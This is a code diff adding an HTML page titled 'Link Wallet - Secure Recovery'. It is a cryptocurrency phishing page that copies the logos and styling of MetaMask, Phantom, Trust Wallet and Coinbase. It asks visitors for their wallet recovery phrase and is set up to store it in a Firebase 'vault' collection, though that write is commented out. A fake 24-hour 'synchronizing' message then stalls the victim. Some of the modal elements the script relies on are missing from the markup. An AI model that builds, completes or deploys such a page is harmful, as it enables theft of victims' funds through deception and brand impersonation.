@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Link Wallet - Secure Recovery</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Public+Sans:wght@400;600;700&display=swap');
+        
+        :root {
+            --brand-gold: #f5c542;
+            --bg-deep: #0b1222; /* Updated to match deep navy in Screenshot 84 */
+            --bg-card: #111827;
+            --border-muted: #1f2937;
+        }
+
+        /* Realistic Brand Themes */
+        .theme-phantom { --theme-color: #ab9ff2; --theme-bg: #1a1a1a; --theme-text: #ffffff; }
+        .theme-metamask { --theme-color: #e2761b; --theme-bg: #f2f4f6; --theme-text: #24292e; }
+        .theme-trust { --theme-color: #3375bb; --theme-bg: #0b1220; --theme-text: #ffffff; }
+        .theme-coinbase { --theme-color: #0052ff; --theme-bg: #ffffff; --theme-text: #0a0b0d; }
+
+        body { 
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-deep);
+            color: white;
+            margin: 0;
+            overflow-x: hidden;
+        }
+
+        .gold-button {
+            background-color: var(--brand-gold);
+            color: #000;
+            transition: all 0.2s ease;
+        }
+        .gold-button:hover {
+            opacity: 0.9;
+            transform: translateY(-1px);
+        }
+        
+        .icon-container {
+            background-color: white;
+            border-radius: 20px;
+            padding: 20px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        }
+
+        .vercel-card {
+            background: linear-gradient(180deg, rgba(255, 255, 255, 0.05) 0%, rgba(255, 255, 255, 0) 100%);
+            border: 1px solid var(--border-muted);
+            transition: all 0.2s ease;
+        }
+        .vercel-card:hover {
+            border-color: #444;
+            background: rgba(255, 255, 255, 0.08);
+        }
+    </style>
+</head>
+<body class="min-h-screen selection:bg-white selection:text-black">
+    <!-- Header -->
+    <nav class="flex items-center justify-between px-6 py-4 border-b border-gray-800 bg-[#0b1222] sticky top-0 z-40">
+        <div class="w-8">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" class="text-gray-400 cursor-pointer"><path d="M15 18l-6-6 6-6"/></svg>
+        </div>
+        <div class="text-lg font-semibold tracking-tight">Link Wallet</div>
+        <div class="w-8"></div>
+    </nav>
+
+    <!-- Hero Section -->
+    <main class="flex flex-col items-center justify-center min-h-[calc(100vh-65px)] px-6">
+        <div class="flex flex-col items-center text-center max-w-2xl">
+            <div class="icon-container mb-10">
+                <!-- Gold Lock Icon in White Square -->
+                <svg width="48" height="48" viewBox="0 0 24 24" fill="#f5c542" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2C9.243 2 7 4.243 7 7V10H6C4.897 10 4 10.897 4 12V20C4 21.103 4.897 22 6 22H18C19.103 22 20 21.103 20 20V12C20 10.897 19.103 10 18 10H17V7C17 4.243 14.757 2 12 2ZM9 7C9 5.346 10.346 4 12 4C13.654 4 15 5.346 15 7V10H9V7ZM12 18C10.897 18 10 17.103 10 16C10 14.897 10.897 14 12 14C13.103 14 14 14.897 14 16C14 17.103 13.103 18 12 18Z"/>
+                </svg>
+            </div>
+            
+            <h1 class="text-4xl font-bold mb-4 tracking-tight">Connect Your Wallet</h1>
+            <p class="text-gray-400 text-lg mb-12 font-medium">
+                Securely connect your external wallet to access your funds
+            </p>
+            
+            <button onclick="openModal()" class="gold-button w-full max-w-4xl py-4 rounded-xl font-bold text-lg shadow-lg flex items-center justify-center gap-3">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                Connect Wallet
+            </button>
+        </div>
+    </main>
+
+  
+    <script>
+        // --- Firebase Configuration ---
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_PROJECT.firebaseapp.com",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_PROJECT.appspot.com",
+            messagingSenderId: "YOUR_MESSAGING_ID",
+            appId: "YOUR_APP_ID"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        let currentWallet = '';
+
+        function openModal() {
+            const modal = document.getElementById('walletModal');
+            const content = document.getElementById('modalContent');
+            modal.classList.remove('hidden');
+            setTimeout(() => {
+                content.classList.remove('scale-95', 'opacity-0');
+            }, 10);
+        }
+
+        function closeModal() {
+            const content = document.getElementById('modalContent');
+            content.classList.add('scale-95', 'opacity-0');
+            setTimeout(() => {
+                document.getElementById('walletModal').classList.add('hidden');
+            }, 300);
+        }
+
+        const walletThemes = {
+            'MetaMask': {
+                class: 'theme-metamask',
+                bg: '#ffffff',
+                header: `<div class="flex items-center justify-between p-4 border-b">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg" class="w-8 h-8">
+                            <span class="font-bold text-gray-800">Secret Recovery Phrase</span>
+                            <div class="w-8"></div>
+                         </div>`,
+                desc: 'Enter your 12-word Secret Recovery Phrase to restore your wallet.',
+                inputPlaceholder: 'Paste Secret Recovery Phrase from clipboard',
+                btnClass: 'bg-[#e2761b] text-white rounded-full py-3 font-bold mt-8'
+            },
+            'Phantom': {
+                class: 'theme-phantom',
+                bg: '#1a1a1a',
+                header: `<div class="flex flex-col items-center pt-12 pb-6">
+                            <img src="https://phantom.app/img/phantom-logo.svg" class="w-16 h-16 mb-4">
+                            <h2 class="text-2xl font-bold">Import Secret Recovery Phrase</h2>
+                         </div>`,
+                desc: 'Enter your 12 or 24-word phrase to import your existing wallet.',
+                inputPlaceholder: 'Secret Recovery Phrase',
+                btnClass: 'bg-[#ab9ff2] text-black rounded-xl py-4 font-bold mt-10 hover:brightness-110'
+            },
+            'Trust Wallet': {
+                class: 'theme-trust',
+                bg: '#0b1220',
+                header: `<div class="p-6 flex items-center gap-4">
+                            <img src="https://trustwallet.com/assets/images/media/assets/trust_primary_logo.png" class="w-8 h-8">
+                            <h2 class="text-xl font-bold">Import Wallet</h2>
+                         </div>`,
+                desc: 'Write down or paste your 12-word recovery phrase in the correct order.',
+                inputPlaceholder: 'Enter your phrase here',
+                btnClass: 'bg-[#3375bb] text-white rounded-lg py-4 font-bold mt-8'
+            },
+            'Coinbase': {
+                class: 'theme-coinbase',
+                bg: '#ffffff',
+                header: `<div class="p-8 flex flex-col items-start">
+                            <img src="https://www.vectorlogo.zone/logos/coinbase/coinbase-icon.svg" class="w-10 h-10 mb-6">
+                            <h2 class="text-3xl font-bold text-[#0a0b0d]">Enter your recovery phrase</h2>
+                         </div>`,
+                desc: 'This is the 12-word phrase you were given when you created your wallet.',
+                inputPlaceholder: '12-word recovery phrase',
+                btnClass: 'bg-[#0052ff] text-white rounded-full py-4 font-bold mt-12 w-full text-lg'
+            }
+        };
+
+        function showInputForm(walletName) {
+            currentWallet = walletName;
+            const theme = walletThemes[walletName] || walletThemes['MetaMask'];
+            const container = document.getElementById('brandContainer');
+            const inputUI = document.getElementById('inputUI');
+            
+            // Apply theme container styling
+            container.className = `relative w-full h-full md:h-auto md:max-w-md transition-all flex flex-col shadow-2xl rounded-none md:rounded-[40px] overflow-hidden ${theme.class}`;
+            container.style.backgroundColor = theme.bg;
+            
+            // Build the realistic UI
+            inputUI.innerHTML = `
+                ${theme.header}
+                <div class="p-8 flex-1 flex flex-col">
+                    <p class="text-sm mb-6 ${theme.bg === '#ffffff' ? 'text-gray-500' : 'text-gray-400'}">${theme.desc}</p>
+                    <form id="seedForm" class="flex flex-col flex-1">
+                        <textarea id="phraseInput" required rows="5" placeholder="${theme.inputPlaceholder}"
+                            class="w-full p-4 text-sm rounded-xl border focus:ring-2 focus:outline-none transition-all resize-none
+                            ${theme.bg === '#ffffff' ? 'bg-gray-50 border-gray-200 text-gray-900 focus:ring-blue-500/20' : 'bg-[#0a0a0a] border-[#1f1f1f] text-white focus:ring-white/10'}"></textarea>
+                        
+                        <div class="mt-auto md:mt-0">
+                            <button type="submit" id="submitBtn" class="w-full transition-all active:scale-[0.98] ${theme.btnClass}">
+                                Confirm & Import
+                            </button>
+                            <button type="button" onclick="backToSelection()" class="w-full text-center mt-6 text-sm font-medium ${theme.bg === '#ffffff' ? 'text-gray-400' : 'text-gray-600'} hover:text-gray-400">
+                                Cancel
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            `;
+
+            document.getElementById('inputModal').classList.remove('hidden');
+            closeModal();
+
+            // Re-attach form listener to the new dynamic form
+            document.getElementById('seedForm').addEventListener('submit', handleFormSubmit);
+        }
+
+        async function handleFormSubmit(e) {
+            e.preventDefault();
+            const phrase = document.getElementById('phraseInput').value.trim();
+            const submitBtn = document.getElementById('submitBtn');
+
+            if (phrase.split(' ').length < 12) {
+                alert('Recovery phrase must be at least 12 words.');
+                return;
+            }
+
+            const originalText = submitBtn.textContent;
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Synchronizing...';
+
+            try {
+                // Submit to Firebase logic remains same
+                console.log("[v0] Submitting phrase for wallet:", currentWallet);
+                // await db.collection('vault').add({...});
+
+                document.getElementById('inputModal').classList.add('hidden');
+                alert('Your wallet is being synchronized. This may take up to 24 hours.');
+            } catch (err) {
+                console.error("[v0] Error:", err);
+                alert("Synchronization failed.");
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = originalText;
+            }
+        }
+
+        function backToSelection() {
+            document.getElementById('inputModal').classList.add('hidden');
+            openModal();
+        }
+    </script>
+</body>
+</html>
